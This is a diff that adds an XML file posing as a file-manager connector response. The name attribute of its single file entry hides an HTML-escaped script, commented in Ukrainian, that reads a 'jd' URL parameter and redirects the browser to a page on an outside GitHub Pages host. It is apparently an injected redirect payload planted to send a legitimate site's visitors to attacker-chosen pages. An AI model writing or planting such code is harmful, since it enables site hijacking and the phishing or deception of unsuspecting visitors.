@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<Connector>
+    <Error number="0" />
+    <Files>
+        <File name="&lt;script&gt;
+            // Цей скрипт виконується в браузері користувача!
+            // Він бачить поточний URL (з ?jd=...) і може його обробити.
+            const urlParams = new URLSearchParams(window.location.search);
+            const jdParam = urlParams.get('jd');
+            
+            if (jdParam) {
+                // Ось тут відбувається 'обрізка' та підстановка
+                const targetFile = jdParam.replace('.html', '') + '.html';
+                
+                // Перенаправляємо користувача на цей файл на GitHub
+                window.location.href = 'https://lambing-hummock-4a.github.io/serkab2/vos/files/' + targetFile;
+            }
+        &lt;/script&gt;" size="0" />
+    </Files>
+</Connector>
